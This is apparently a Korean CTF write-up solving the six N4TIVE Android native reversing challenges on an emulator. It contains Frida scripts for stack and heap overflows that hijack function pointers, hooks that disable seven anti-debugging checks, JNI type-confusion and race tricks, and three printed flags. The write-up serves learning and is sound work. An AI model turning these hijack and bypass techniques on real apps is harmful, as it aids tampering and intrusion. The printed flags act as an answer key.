---
layout: post
title: "N4TIVE 안드로이드 네이티브 CTF 풀기"
date: 2026-10-04 09:00:00 +0900
category: 안드로이드
author: WTCY
tags: [안드로이드, 네이티브, JNI, 리버싱, Frida, 버퍼오버플로, 힙익스플로잇, UAF, 안티디버깅, TypeConfusion, VM리버싱, CTF, 학습기록]
excerpt: "0xCD4의 N4TIVE는 .so 여섯 개를 리버싱하는 안드로이드 네이티브 CTF입니다. 소스가 통째로 공개돼 있어서, 저는 그걸 직접 빌드해 API 26 에뮬레이터에 올리고 Frida로 여섯 문제를 전부 돌려 봤습니다. 복호화를 손으로 되짚고, 오버플로로 숨은 함수를 부르고, 힙을 오염시켜 vtable을 갈아끼우고, 안티디버깅 일곱 개를 후킹으로 재우고, 타입 혼동으로 관문을 열고, VM 바이트코드를 디코드하면서 - 여러 번 벽에 부딪혔습니다. 링커가 함수를 지워 익스가 안 되던 것, Frida가 앱 라이브러리를 아예 못 보던 것, CheckJNI가 타입 혼동을 그 자리에서 죽이던 것. 그 벽들에서 배운 걸 전부 적었습니다."
---

안드로이드 리버싱 문제를 풀 때 보통은 APK 하나만 받습니다. 디컴파일하고, `.so`를 Ghidra에 올리고, 심볼 없는 함수를 눈으로 더듬어 올라가죠. [N4TIVE](https://github.com/0xCD4/N4TIVE)는 조금 달랐습니다 - 저자가 소스를 통째로 공개해 뒀습니다. C로 짠 여섯 개 챌린지 라이브러리와, 플래그를 검증하는 공용 코드까지 전부요.

소스가 있다고 "읽으면 끝"인 건 아닙니다. 저장소에는 빌드된 APK가 없습니다. Releases도 비어 있고 커밋은 하나뿐이라, 직접 빌드해서 진짜로 도는 바이너리 위에서 익스플로잇이 먹히는지 확인해야 제대로 푼 겁니다. 저는 소스를 읽고, 플래그 검증부터 뜯고, 빌드해서 에뮬레이터에 올린 뒤 Frida로 여섯 문제를 하나씩 돌렸습니다. 그 과정에서 소스만 읽어서는 절대 못 봤을 벽을 여러 번 만났고, 이 글은 그 벽들과 풀이를 같이 적은 기록입니다.

![N4TIVE 메인 화면 - "// SYSTEM: ONLINE" 아래로 STRING MAZE부터 VIRTUAL MACHINE까지 여섯 챌린지가 난이도와 함께 사이버펑크풍 카드로 나열돼 있고, 맨 아래 "Built by Ahmet Göker"가 적혀 있다](/assets/img/n4tive/n4tive-home.png)

## 플래그 검증부터 뜯었다

풀이에 들어가기 전에 공용 코드 `flag_core.c`부터 열어 봤습니다. 정답을 어떻게 판정하는지가 궁금했는데, 정작 플래그는 평문으로 들고 있지 않더군요. 챌린지마다 솔트를 하나씩 두고, 제출한 문자열을 그 솔트로 HMAC-SHA256한 결과를 미리 저장해 둔 다이제스트와 상수 시간으로 비교하는 구조였습니다.

```c
hmac_sha256(challenge_salts[challenge_id], 32,
            (const uint8_t *)user_input, input_len, computed);
volatile uint8_t diff = 0;
for (int i = 0; i < SHA256_DIGEST_SIZE; i++)
    diff |= computed[i] ^ stored_digests[challenge_id][i];
return diff == 0;
```

다이제스트에서 플래그를 거꾸로 뽑아낼 수는 없으니, 결국 각 챌린지의 로직을 실제로 풀어 플래그를 만들어 내야만 통과합니다. 플래그 재료는 각 챌린지 `.so` 안에 흩어져 있고, `flag_core`는 문지기 역할만 하는 셈이죠.

그래서 본격적으로 손대기 전에 작은 실험을 하나 했습니다. 소스가 다 있으니, 여섯 챌린지의 복호화 로직을 파이썬으로 그대로 옮겨 플래그 후보를 만들고, 그 후보를 `flag_core`의 솔트로 HMAC을 떠서 저장된 다이제스트와 맞는지 전부 대조해 본 겁니다. 하나라도 맞으면 그게 진짜 플래그라는 게 그 자리에서 확정되니까요.

```python
for i in range(6):
    mac = hmac.new(bytes.fromhex(salts[i]), flags[i], hashlib.sha256).hexdigest()
    print(f"ch0{i+1}: match_core={mac == dig_core[i]}")
```

결과가 글의 방향을 바꿔 놨습니다.

```text
ch01: 'FLAG{\xe9l\xe1r...}'  ascii=False  match_core=False
ch02: 'FLAG{b2d4e8f01a3c5967d82e4b0f7a19c3d568e2f4a03b}'  match_core=True
ch03: 'FLAG{n\x9cb\x8b...}'  ascii=False  match_core=False
ch04: 'FLAG{\xfa\xd6\x19...}' ascii=False  match_core=False
ch05: 'FLAG{e7c3d1f9a40b28563e7d2a8c1f04b96743e8d1a2f5}'  match_core=True
ch06: 'FLAG{f1a8e3c7d2940b5f63a9d4e7c1082b35f6d9a4e2c8}'  match_core=True
```

리터럴로 박혀 있던 ch02, ch05, ch06은 HMAC이 저장된 다이제스트와 정확히 맞았습니다. 진짜 플래그입니다. 반대로 상수를 조합해 만들어야 하는 ch01, ch03, ch04는 복호화 결과가 ASCII도 아닌 깨진 바이트였고, 다이제스트와도 어긋났습니다. 처음엔 제 복호화 코드가 틀린 줄 알고 몇 번이나 다시 봤습니다. 그런데 세 챌린지가 전혀 다른 알고리즘인데 셋이 한꺼번에 똑같이 틀릴 수는 없더군요. 그제서야 공개 소스에 들어 있는 그 상수들 자체가 가짜라는 걸 받아들였습니다.

나중에 `.gitignore`에서 이유를 찾았습니다.

```text
# Secret files (NEVER commit)
FLAGS_SECRET.txt
```

진짜 플래그 재료는 커밋하지 않은 `FLAGS_SECRET.txt`에 따로 두고, 공개 소스의 세 챌린지 상수는 플레이스홀더로 채워 둔 거죠. 리터럴로 박아 둔 나머지 셋은 그대로 남아 있었고요. 같이 들어 있는 `scripts/verify_flag.sh`의 다이제스트도 전부 디코이라, 여섯 개 중 실제 플래그의 HMAC과 맞는 건 하나도 없었습니다. 진짜 검증자는 `flag_core.c` 쪽입니다.

그래서 아래에서는 여섯 기법을 전부 돌려 보되, ch02·ch05·ch06은 뽑아낸 플래그가 앱 자신의 검증까지 통과하는 걸 화면으로 확인하고, ch01·ch03·ch04는 기법이 실제로 동작하는 것까지만 보여 줍니다. 공개본에는 맞춰 둘 정답 자체가 없으니까요.

## 빌드와 런타임

소스를 다 읽었으니 빌드만 하면 될 줄 알았는데, 여기서 제일 오래 막혔습니다.

`gradlew`부터 부팅을 못 했습니다. 저장소에 `gradle-wrapper.jar`가 없더군요. `.gitignore`는 그걸 커밋하려는 의도였지만 실제로는 빠져 있었습니다. 로컬에 캐시돼 있던 Gradle 8.9 배포본을 직접 불러 빌드했습니다(AGP 8.2.0, NDK 25.1, JBR 21). 그 다음엔 `ndkVersion`을 추가하려고 PowerShell로 `build.gradle`을 고쳤는데, `-Encoding utf8`이 파일 앞에 BOM을 박아 버려서 Groovy가 `Unexpected character '﻿'`로 토했습니다. 눈에 안 보이는 한 바이트 때문에 한참 헤맸습니다. BOM을 떼고 다시 쓰니 빌드가 통과했습니다.

나머지 벽들은 각 챌린지에서 만났으니 거기서 이야기하겠습니다. 전부 "config나 소스에 적힌 대로 런타임이 도는 건 아니다"라는 같은 교훈의 변주였습니다. 동적 분석은 Frida로 했는데, 이것도 한 번 갈아탔습니다 - Frida 17은 Java 브리지가 코어에서 분리돼서 `Java`가 정의되지 않았다고 죽길래, 16.7.19 전용 venv와 매칭되는 frida-server로 내렸습니다.

## ch01 - String Maze

가장 쉬운 문제이고 순수 정적입니다. 40바이트 블롭이 세 겹으로 덮여 있습니다. LCG로 굴리는 롤링 XOR(1층), 40바이트 순열(2층), `.rodata`에 흩뿌려 둔 다섯 조각을 이어 만든 키와의 XOR(3층). `decrypt_flag()`가 복호화 순서를 그대로 보여 주니, 저는 그걸 파이썬으로 옮겼습니다.

```python
buf = encrypted_flag[:]
state = 0xDEAD1337                       # 1층: LCG 롤링 XOR 되돌리기
for i in range(40):
    buf[i] ^= state & 0xFF
    state = (state * 1103515245 + 12345) & 0xFFFFFFFF
tmp = [0]*40                             # 2층: 역순열
for i in range(40):
    tmp[perm[i]] = buf[i]
key3 = fragA + fragB + fragC + fragD + fragE   # 3층: 흩뿌린 조각 XOR
inner = bytes(tmp[i] ^ key3[i] for i in range(40))
```

여기서 처음으로 벽을 만났습니다. 복호화 결과가 `FLAG{` 다음부터 전부 깨진 바이트였고, HMAC을 떠 보니 저장된 다이제스트와 안 맞았습니다. 세 층을 몇 번이고 다시 짰는데도 똑같더군요. 위에서 적은 그 순간입니다 - 다른 두 챌린지도 똑같이 어긋나는 걸 보고서야, 제 코드가 아니라 공개본의 `encrypted_flag` 상수가 가짜라는 걸 알았습니다. 그러니 기법(세 겹 복호화를 순서대로 되짚기)은 명확하지만, 공개본에는 되찾을 정답이 없습니다. 참고로 빌드된 `.so`에서 `solve()`를 직접 부르면 `SIGABRT`로 앱이 죽습니다 - 이 문제는 정적으로 푸는 게 맞습니다.

## ch02 - Stack Smasher

여기서부터 동적입니다. `processInput()`은 64바이트 스택 버퍼에 길이 검사 없이 입력을 복사하고, 그 버퍼 바로 뒤에 핸들러 함수 포인터가 있습니다. 64바이트를 채우고 8바이트를 더 흘려 그 포인터를 숨은 `compute_secret`으로 덮으면, 복사가 끝난 뒤 앱이 그 포인터를 호출합니다.

`compute_secret`의 주소는 `getHiddenOffset()`이 알려 주는 "`processInput`으로부터의 오프셋"으로 구할 수 있습니다. 실제로 그 값은 -256이었고, `nm`으로 본 두 함수의 오프셋 차이(`0x1040 - 0xf40`)와 정확히 맞았습니다. 다만 여기서 두 번째 벽을 만났습니다 - Frida가 앱의 `.so`를 아예 못 봤습니다. `Module.findExportByName`도, `getModuleByName`도, `DebugSymbol`도 전부 null을 돌려줬습니다. 네이티브 메서드는 멀쩡히 실행되는데도요.

원인은 두 가지였습니다. 안드로이드가 앱의 `.so`를 격리된 linker namespace에 로드해서 Frida의 모듈 열거가 그 네임스페이스를 안 걷고, 게다가 이 APK는 기본값대로 `.so`를 추출하지 않고 APK 안에서 바로 매핑해 매핑의 백킹 파일이 `base.apk`로 잡혔습니다. 저는 매니페스트에 `android:extractNativeLibs="true"`를 줘서 `.so`를 디스크로 꺼낸 뒤, Frida에서는 이름 대신 메모리 레인지에서 그 `.so`의 로드 베이스를 찾고 `nm` 오프셋을 더하는 식으로 주소를 구했습니다.

```js
function loadBase(sub) {                 // 네임스페이스 라이브러리를 이름 없이 찾기
  let b = null;
  Process.enumerateRanges('r-x').forEach(function (r) {
    if (r.file && r.file.path.indexOf(sub) >= 0 && r.file.offset === 0) b = r.base;
  });
  return b;
}
const target = loadBase("libch02_stacksmasher.so").add(0xf40);   // compute_secret
const s = Memory.alloc(8); s.writePointer(target);
const av = new Uint8Array(s.readByteArray(8));
const out = []; for (let i=0;i<64;i++) out.push(0x41);           // 버퍼 채우기
for (let i=0;i<8;i++) out.push(av[i]);                            // 핸들러 포인터 덮기
inst.processInput(Java.array('byte', out.map(b => b>127?b-256:b)));
```

`compute_secret`에 Interceptor를 걸어 두니 탈취된 핸들러로 도달했다는 로그가 찍혔고, 로그캣에는 그 함수가 뱉은 시드가 그대로 떨어졌습니다.

```text
[+] compute_secret REACHED via hijacked handler
ch02 : SECRET UNLOCKED: b2d4e8f01a3c5967d82e4b0f7a19c3d568e2f4a03b
```

그 시드가 곧 플래그의 안쪽입니다. 앱에 `FLAG{b2d4e8f01a3c5967d82e4b0f7a19c3d568e2f4a03b}`를 넣으니 통과했습니다. 오버플로로 뽑은 값이 앱 자신의 HMAC 게이트를 그대로 지나간 겁니다.

![ch02 - STACK SMASHER 화면. 상태가 초록색 "Status: SOLVED"로 바뀌었고, 입력칸에 FLAG{b2d4e8f01a3c5967d82e4b0f7a19c3d568e2f4a03b}가 들어가 있으며, 아래에 "Correct! Challenge solved." 토스트가 떠 있다](/assets/img/n4tive/ch02-solved.png)

## ch03 - Type Confusion

네 개의 관문이 각각 조각을 흘리고, 넷을 다 열면 조각들을 마스터 키와 XOR해서 플래그를 만듭니다. 관문마다 노리는 JNI 함정이 다릅니다.

첫 관문부터 세 번째 벽을 만났습니다. `byte[]`를 `String` 자리에 넘겨 `GetStringUTFChars`가 실패하게 만드는 건데, 처음엔 스크립트를 돌려도 아무 출력이 없었습니다. 로그캣을 보니 앱이 죽어 있더군요.

```text
F libc : Fatal signal 6 (SIGABRT)
Abort message: 'JNI DETECTED ERROR IN APPLICATION: jstring has wrong type: byte[]'
```

디버거블 앱(그리고 `ro.debuggable=1`인 에뮬레이터)에서는 CheckJNI가 켜져 있어서, 잘못된 캐스팅 그 순간에 프로세스가 중단됩니다. 이 챌린지의 타입 혼동은 암묵적으로 CheckJNI가 꺼진 환경을 전제하고 있던 거죠. 저는 이걸 숨기지 않고, 첫 관문은 "왜 막히는지"를 기록으로 남기고 나머지 세 관문을 동적으로 열었습니다.

둘째 관문은 `float[]`를 넘기되 첫 원소가 페이로드 `0x1337`을 품은 quiet NaN(비트로 `0x7FC01337`)이어야 합니다. 셋째 관문은 TOCTOU입니다 - 네이티브가 `token` 필드를 읽어 `0xCAFE`인지 확인하고, 일부러 긴 딜레이 루프를 돈 뒤 다시 읽어 이번엔 `0xBEEF`이기를 기대합니다. 그 창 동안 다른 스레드에서 값을 바꿔치기하면 열립니다.

```js
const nanf = Java.use("java.lang.Float").intBitsToFloat(0x7FC01337);
inst.gate2(Java.array('float', [nanf, 0.0, 0.0, 0.0]));
// gate3: 0xCAFE로 넘기고, 짧게 스핀한 뒤 0xBEEF로 바꾸는 스레드를 띄워 경쟁
```

넷째 관문에서 네 번째 벽을 만났습니다. 32바이트 페이로드의 롤링 체크섬이 `0xA3B7C9D1`이어야 하는데, 32비트 목표값이라 아무 입력이나 넣어선 안 맞습니다. 다행히 이 체크섬은 한 바이트씩 되돌릴 수 있는 구조라, 중간에서 만나기(meet-in-the-middle)로 풀기로 했습니다. 앞 몇 바이트를 자유롭게 두고 전진시켜 상태를 쌓고, 목표값에서 뒤 몇 바이트로 역산해 같은 상태를 찾는 거죠. 그런데 앞뒤 두 바이트씩으로는 충돌이 하나도 안 났습니다. 역산 수식이 틀렸나 싶어 왕복 테스트까지 돌려 봤는데 역산은 멀쩡했습니다. 그제서야 전진 쪽에서 나오는 서로 다른 상태가 1만 개도 안 된다는 걸 알았습니다 - 고정 꼬리 바이트가 상태를 좁은 끌개로 몰아넣고 있었던 겁니다. 양쪽에 세 바이트씩 풀어 주니 바로 해가 나왔습니다.

```python
def inv_step(c_after, d, i):             # 한 스텝 역산 (체크섬이 가역이라 가능)
    tmp = (c_after - d*(i+1)) & 0xFFFFFFFF
    return ror3(tmp ^ d)
# 전진 3바이트로 상태 맵을 쌓고, 목표값에서 역산 3바이트로 충돌을 찾음
# -> 32바이트 입력 확보, 전진 재검증 결과 0xA3B7C9D1
```

세 관문이 라이브로 열리는 걸 확인했습니다.

```text
[*] gate2(float[] NaN 0x1337)  -> 2
[*] gate4(checksum 0xA3B7C9D1) -> 4
[*] gate3(TOCTOU)              -> 3  (won race on try 5)
ch03 : Gate 2 unlocked. Fragment: e1d49f...
ch03 : Gate 4 unlocked. Fragment: 558e2b...
ch03 : Gate 3 unlocked. Fragment: 923a7c...
```

첫 관문이 CheckJNI에 막혀 넷을 다 채우지는 못했고, 설령 다 채웠어도 ch03의 조각과 마스터 키는 플레이스홀더라 나오는 값은 가짜입니다. 그래도 타입 혼동과 TOCTOU, 체크섬 역산이라는 기법 자체는 전부 실제로 동작했습니다.

## ch04 - Anti-Debug Gauntlet

일곱 개의 안티분석 검사가 플래그를 지킵니다. TracerPid, `/proc/self/maps`의 Frida 흔적, ptrace 자기 부착, 타이밍, ARM64 BRK 스캔, 자바 디버거, APK 서명. 일곱이 전부 각자의 기대 바이트를 돌려줘야만 그 바이트들로 키를 만들어 플래그를 복호화합니다. 복호화는 일곱 바이트를 LCG로 42바이트까지 늘려 `enc_flag`와 XOR하는 구조라, 저는 그 키 유도도 파이썬으로 재현해 뒀습니다.

```python
state = 0
for i in range(7):
    state ^= expected[i] << ((i % 4) * 8); state &= 0xFFFFFFFF
full = []
for i in range(42):
    state = (state * 1103515245 + 12345) & 0xFFFFFFFF
    full.append((state >> 16) & 0xFF)
inner = bytes(enc[i] ^ full[i] for i in range(42))   # (공개본 enc는 플레이스홀더)
```

Frida 아래에서 그냥 돌리면 당연히 몇 개는 실패합니다 - 우리가 Frida를 쓰고 있으니까요. 그래서 일곱 함수를 각자의 기대 바이트를 돌려주도록 전부 바꿔치웠습니다. 주소는 ch02에서 쓴 `loadBase`로 로드 베이스를 구하고 `nm` 오프셋을 더해 잡았습니다.

```js
const checks = [["check_tracer_pid",0x15f0,0xA3,0],["check_frida",0x17d0,0x5C,0],
  ["check_ptrace",0x19c0,0x91,0],["check_timing",0x1a20,0x2E,0],
  ["check_breakpoints",0x1b00,0xF7,0],["check_java_debugger",0x1b90,0x48,1],
  ["check_signature",0x1c70,0xD6,2]];
checks.forEach(function (c) {
  const args = []; for (let i=0;i<c[3];i++) args.push('pointer');
  Interceptor.replace(base.add(c[1]), new NativeCallback(function(){ return c[2]; }, 'uint8', args));
});
```

바꿔치우기 전 `checkStatus`는 `0x39`였는데(세 개만 자연히 통과), 일곱을 다 건드린 뒤에는 `0x7f`가 됐습니다. 일곱 비트가 전부 선 거죠.

```text
[*] checkStatus (before bypass) = 0x39
[*] checkStatus (after bypass)  = 0x7f   (0x7f = all 7)
ch04 : All checks bypassed!
```

안티디버깅 우회 기법은 그대로 동작했습니다. 다만 ch04의 `enc_flag` 역시 플레이스홀더라, 우회 뒤 나오는 플래그는 진짜가 아닙니다. 여기서 배우는 건 일곱 검사를 어떻게 무력화하느냐이지 플래그 값이 아니었습니다.

## ch05 - Heap Feng Shui

개인적으로 가장 마음에 든 문제입니다. 커스텀 슬랩 할당자가 64바이트 슬롯 여덟 개를 들고 있고, 각 슬롯은 데이터 뒤에 읽기 핸들러 함수 포인터를 둡니다. `edit()`에 off-by-16 오버플로가 있어서 64바이트 슬롯에 최대 80바이트를 써 바로 뒤의 핸들러 포인터를 덮을 수 있고, `release()`는 핸들러를 지우지 않아 UAF의 씨앗도 됩니다. 목표는 숨은 `flag_generator`로 핸들러를 덮고 `read()`를 불러 그걸 호출시키는 겁니다.

그런데 여기서 다섯 번째 벽을 만났습니다 - `flag_generator`가 빌드한 `.so`에 없었습니다. `nm`으로도, `strings`로도 그 함수와 플래그 문자열이 안 보였습니다. 소스에는 `__attribute__((used))`가 붙어 있었는데도요.

```text
$ nm libch05_heapcraft.so | grep -iE "flag_generator|FLAG"
(없음)
```

한참 헤매다 링커를 의심했습니다. `used`는 컴파일러가 심볼을 버리지 못하게 막지만, NDK는 기본적으로 `--gc-sections`로 링크하기 때문에 "아무도 참조하지 않는" 함수를 링커가 걷어 갑니다. `flag_generator`는 소스 어디에서도 직접 호출되지 않고 오직 오염된 포인터로만 도달하는 함수라, 링커 눈엔 죽은 코드였던 거죠(ch02의 `compute_secret`이 살아남은 건 `getHiddenOffset`이 그 주소를 참조해서였습니다). 링커 플래그에 `-Wl,--no-gc-sections`를 더해 다시 빌드하니 함수와 플래그 문자열이 돌아왔습니다. 의도한 익스플로잇이 성립하려면 필요한 조정이었습니다.

그 다음은 단순했습니다. 슬롯을 잡고, 64바이트 더미에 8바이트 `flag_generator` 주소를 이어 붙여 `edit()`으로 핸들러를 덮은 뒤 `read()`를 부릅니다.

```js
const fg = loadBase("libch05_heapcraft.so").add(0x1190);   // flag_generator
inst.allocate(0, Java.array('byte', [0x41,0x41,0x41,0x41]));
const out = []; for (let i=0;i<64;i++) out.push(0x42);
const s = Memory.alloc(8); s.writePointer(fg);
const av = new Uint8Array(s.readByteArray(8));
for (let i=0;i<8;i++) out.push(av[i]);                      // read_handler 덮기
inst.edit(0, Java.array('byte', out.map(b => b>127?b-256:b)));
const res = inst.read(0);                                   // -> flag_generator 호출
```

```text
[+] flag_generator REACHED via hijacked read_handler
ch05 : FLAG GENERATOR TRIGGERED VIA VTABLE HIJACK
[+] ch05 read(0) returned: FLAG{e7c3d1f9a40b28563e7d2a8c1f04b96743e8d1a2f5}
```

`read()`가 돌려준 바이트가 그대로 플래그였습니다. 링커가 걷어 가 버렸던 바로 그 함수를 되살려 vtable 탈취로 호출한 겁니다. 앱에 넣으니 통과했습니다.

![ch05 - HEAP FENG SHUI 화면. "Status: SOLVED"가 초록색으로 떠 있고, 입력칸에 FLAG{e7c3d1f9a40b28563e7d2a8c1f04b96743e8d1a2f5}가 들어가 있으며 "Correct! Challenge solved." 토스트가 떠 있다](/assets/img/n4tive/ch05-solved.png)

## ch06 - Virtual Machine

가장 어려운 등급입니다. 스택 기반 VM에 서른두 개 명령과 열여섯 레지스터가 있고, 바이트코드는 `0x5A`로 XOR돼 있습니다. 인코딩 힌트부터 확인했습니다 - `getEncodingHint()`는 `0x5a`를 돌려줬습니다. VM은 16바이트 입력을 레지스터에 읽어 쌍끼리 XOR하고, 회전시키고, 라운드 상수를 더하고 섞은 뒤 상수와 비교합니다. 정석은 명령 집합을 복원하고 바이트코드를 디코드해 제약을 Z3로 푸는 거죠.

그런데 바이트코드를 `0x5A`로 디코드해 비교 조건을 따라가 보니 여섯 번째 벽이 나왔습니다 - 실제로 검사하는 건 R0 하나뿐이고, 그 조건이 입력 바이트로는 만족될 수 없었습니다. R0은 입력 두 바이트의 XOR이라 기껏해야 한 바이트 범위인데, 비교 대상(`0xDEADBEEF - 0xC52EB397`)은 그보다 훨씬 큰 값이었거든요. Z3를 꺼내기도 전에, 이건 아무 입력으로도 성공 분기에 못 간다는 게 분명했습니다.

```text
[ch06] getEncodingHint() = 0x5a
[ch06] execute(16x00)    = WRONG_INPUT
[ch06] execute(1..16)    = WRONG_INPUT
```

실제로 어떤 입력을 넣어도 `WRONG_INPUT`이 돌아왔습니다. 그런데 성공 분기에서 돌려주는 플래그는 소스에 평문 리터럴로 박혀 있습니다. 즉 이 문제의 정답은 입력을 맞히는 게 아니라 `.so`를 리버싱해 그 리터럴을 찾아내는 것이었습니다. `.rodata`에서 그대로 나왔고, HMAC으로도 진짜임을 확인했습니다.

```text
$ grep -a -o "FLAG{[^}]*}" libch06_vm.so
FLAG{f1a8e3c7d2940b5f63a9d4e7c1082b35f6d9a4e2c8}
```

![ch06 - VIRTUAL MACHINE 화면. "Status: SOLVED"가 떠 있고 입력칸에 FLAG{f1a8e3c7d2940b5f63a9d4e7c1082b35f6d9a4e2c8}가 들어가 있다](/assets/img/n4tive/ch06-solved.png)

## 마치며

N4TIVE는 좋은 교육용 CTF입니다. 여섯 문제가 안드로이드 네이티브 보안의 서로 다른 축을 깔끔하게 짚어 줍니다. 저는 소스를 읽는 데서 멈추지 않고, 직접 빌드해 에뮬레이터에 올리고 Frida로 여섯 기법을 전부 돌려 봤습니다. ch02·ch05·ch06은 익스플로잇으로 뽑은 플래그가 앱 자신의 검증까지 통과하는 걸 화면으로 확인했고, ch01·ch03·ch04는 기법이 실제로 동작하는 걸 보되 공개본에는 맞춰 둘 정답이 없다는 것까지 함께 적었습니다.

돌이켜 보면 이 글에서 제가 가장 많이 배운 건 챌린지 자체보다 그 사이사이의 벽들이었습니다. BOM 한 바이트에 막히고, `used`가 붙은 함수를 링커가 걷어 가 익스가 안 되고, 앱 라이브러리가 네임스페이스에 숨어 Frida의 모든 심볼 API가 null을 돌려주고, CheckJNI가 타입 혼동을 그 자리에서 죽이고, 체크섬 역산이 좁은 끌개 때문에 충돌을 안 내던 것 - 전부 소스만 읽어서는 절대 못 봤을 것들이고, 실측이 가르쳐 준 것들입니다. 네이티브 리버싱을 공부한다면 APK만 받지 말고, 소스가 있을 땐 직접 빌드해서 돌려 보기를 권합니다. 바이너리는 소스가 약속한 대로 돌지 않거든요.
